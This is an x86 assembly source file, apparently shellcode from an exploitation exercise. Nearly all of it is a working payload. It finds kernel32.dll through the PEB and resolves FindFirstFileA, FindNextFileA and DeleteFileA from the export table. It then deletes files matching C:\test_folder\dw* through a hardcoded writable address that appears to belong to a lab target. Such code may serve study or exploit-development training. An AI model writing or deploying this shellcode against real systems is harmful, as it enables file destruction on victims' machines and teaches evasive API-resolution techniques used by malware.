BITS 32

start:
  
find_win_exec:
  ; Allocate stack frame for variables
  push ebp
  mov ebp, esp
  sub esp, 0x40

  ; Save strings on the stack
  
  ; FindFirstFileA
  xor ebx, ebx
  push ebx ; \x00
  push word 0x4165
  push 0x6c694674
  push 0x73726946
  push 0x646e6946
  mov [ebp-0x04], esp ; var4 = "FindFirstFileA\x00"

  ; FindNextFileA
  xor ebx, ebx
  push ebx ; \x00
  push 0x41
  push 0x656c6946
  push 0x7478654e
  push 0x646e6946
  mov [ebp-0x08], esp ; var8 = "FindNextFileA\x00"

  ; DeleteFileA
  xor ebx, ebx
  push ebx ; \x00
  push 0x41
  push word 0x656c
  push 0x69466574
  push 0x656c6544
  mov [ebp-0x0c], esp ; var_c = "DeleteFileA\x00"

  ; C:\\test_folder\\dw*
  xor ebx, ebx
  push ebx ; \x00
  push ebx ; \x00
  push ebx ; \x00
  push ebx ; \x00
  push ebx ; \x00
  push word 0x2a77
  push 0x645c7265
  push 0x646c6f66
  push 0x5f747365
  push 0x745c3a43
  mov [ebp-0x10], esp ; var10 = "C:\\test_folder\\dw*\x00"

  ; Get kernel32.dll base address
  xor eax, eax
  xor ecx, ecx
  mov cl, 0x30
  mov ebx, fs:[ecx]

  mov ebx, [ebx + 0x0c]
  mov ebx, [ebx + 0x14]

  mov ebx, [ebx]
  mov ebx, [ebx]
  ; kernel32.dll ba
  mov ebx, [ebx + 0x10]
  
  mov [ebp-0x14], ebx ; save base address

  ; Get PE signature
  mov edx, [ebx + 0x3c] ; RVA
  add edx, ebx

  ; Get Export Table + 0x78
  mov edx, [edx + 0x78] ; RVA
  add edx, ebx

  ; Get number of exported functions
  mov ecx, [edx + 0x14]
  mov [ebp-0x18], ecx

  ; Get address table rva
  mov esi, [edx + 0x1c]
  ; Get address table
  add esi, ebx
  ; Save on the stack
  mov [ebp-0x1c], esi

  ; Get name table rva
  mov esi, [edx + 0x20]
  ; Get name table
  add esi, ebx
  ; Save on the stack
  mov [ebp-0x20], esi

  ; Get ordinary table rva
  mov esi, [edx + 0x24]
  ; Get ordinary table
  add esi, ebx
  ; Save on the stack
  mov [ebp-0x24], esi
  
  xor eax, eax
  mov edx, ecx

loop_find_first_file_a:
  mov edi, [ebp-0x20]    ; name table
  mov esi, [ebp-0x04]    ; var4 = "FindFirstFileA\x00"
  xor ecx, ecx

  cld 
  mov edi, [edi+eax*4]
  add edi, ebx

  add cx, 14
  repe cmpsb

  jz found_find_first_file_a
  
  inc eax
  cmp eax, edx
  jb loop_find_first_file_a

  ; jmp exit_loop

found_find_first_file_a:
  ; Get ordinal number
  mov ecx, [ebp-0x24]
  mov edx, [ebp-0x1c] ; addr_table
  
  mov ax, [ecx + eax*2]
  mov eax, [edx + eax*4]
  add eax, ebx

  mov [ebp-0x28], eax

  xor eax, eax
  mov edx, [ebp-0x18]
  
loop_find_next_file_a:
  mov edi, [ebp-0x20] ; name table
  mov esi, [ebp-0x08] ; FindNextFileA 
  xor ecx, ecx

  cld 
  mov edi, [edi+eax*4]
  add edi, ebx

  add cx, 13
  repe cmpsb

  jz found_find_next_file_a
  
  inc eax
  cmp eax, edx
  jb loop_find_next_file_a

  ; jmp exit_loop

found_find_next_file_a:
  ; Get ordinal number
  mov ecx, [ebp-0x24]
  mov edx, [ebp-0x1c] ; addr_table
  
  mov ax, [ecx + eax*2]
  mov eax, [edx + eax*4]
  add eax, ebx

  mov [ebp-0x2c], eax

  xor eax, eax
  mov edx, [ebp-0x18]

loop_find_delete_file_a:
  mov edi, [ebp-0x20] ; name table
  mov esi, [ebp-0x0c] ; DeleteFileA
  xor ecx, ecx

  cld 
  mov edi, [edi+eax*4]
  add edi, ebx

  add cx, 11
  repe cmpsb

  jz found_delete_file_a
  
  inc eax
  cmp eax, edx
  jb loop_find_delete_file_a

  ; jmp exit_loop

found_delete_file_a:
  ; Get ordinal number
  mov ecx, [ebp-0x24]
  mov edx, [ebp-0x1c] ; addr_table
  
  mov ax, [ecx + eax*2]
  mov eax, [edx + eax*4]
  add eax, ebx

  mov [ebp-0x30], eax


; --------- MAIN PAYLOAD ---------
execute_find_first_file_a:

  mov esi, [ebp-0x10]
  xor ebx, ebx
  
  push 0x62505338   ; Writable location from func.dll
  push esi          ; C:\\test_folder\\dw*
  
  mov eax, [ebp-0x28]
  call eax

  mov [ebp-0x14], eax ; save file search handle
  
  xor ecx, ecx
  add ecx, 15 ; start_idx

  mov eax, 0x62505338
  add eax, 44

copy_loop:
  mov esi, [eax]

  test esi, esi
  jz end_loop
  
  mov ebx, [ebp-0x10]
  mov [ebx+ecx*1], esi

  add eax, 4
  add ecx, 4

  jmp copy_loop

end_loop:
  mov eax, [ebp-0x10] ; Path
  push eax

  mov eax, [ebp-0x30] ; DeleteFileA
  call eax

loop_search_next_files:
  mov eax, [ebp-0x14] ; Saved handle
  
  push 0x62505338     ; Writable location from func.dll
  push eax

  mov eax, [ebp-0x2c] ; FindNextFileA
  call eax

  test eax, eax ; if (FALSE)
  jz end_loop

  xor ecx, ecx
  add ecx, 15 ; start_idx

  mov eax, 0x62505338
  add eax, 44

copy_loop_2:
  mov esi, [eax]

  test esi, esi
  jz end_loop_2
  
  mov ebx, [ebp-0x10]
  mov [ebx+ecx*1], esi

  add eax, 4
  add ecx, 4

  jmp copy_loop_2

end_loop_2:
  mov eax, [ebp-0x10] ; Path
  push eax

  mov eax, [ebp-0x30] ; DeleteFileA
  call eax

  test eax, eax
  jz exit_loop

  jmp loop_search_next_files
  
exit_loop:
  ret
  
  
  




  




